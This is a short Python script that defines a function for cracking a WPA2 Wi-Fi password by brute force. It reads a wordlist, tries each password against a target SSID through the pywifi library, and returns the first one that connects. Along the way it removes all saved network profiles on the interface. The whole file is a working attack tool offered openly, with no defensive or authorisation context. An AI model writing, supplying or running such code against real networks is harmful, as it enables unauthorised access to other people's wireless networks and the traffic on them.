import time
import pywifi
from pywifi import const

def crack_wifi_password(ssid, wordlist_file):
    """
    Attempts to crack the WiFi password of the given SSID using the provided wordlist file.
    :param ssid: The WiFi network name (SSID) to target.
    :param wordlist_file: The file containing potential passwords, one per line.
    :return: Password if successful, or None if unsuccessful.
    """
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    # Read the wordlist file
    try:
        with open(wordlist_file, 'r') as f:
            passwords = [line.strip() for line in f]
    except FileNotFoundError:
        return "Wordlist file not found."

    # Iterate over passwords
    for password in passwords:
        try:
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password

            iface.remove_all_network_profiles()
            tmp_profile = iface.add_network_profile(profile)

            iface.connect(tmp_profile)
            time.sleep(4)

            if iface.status() == const.IFACE_CONNECTED:
                iface.disconnect()
                return password
        except Exception:
            continue

    return None
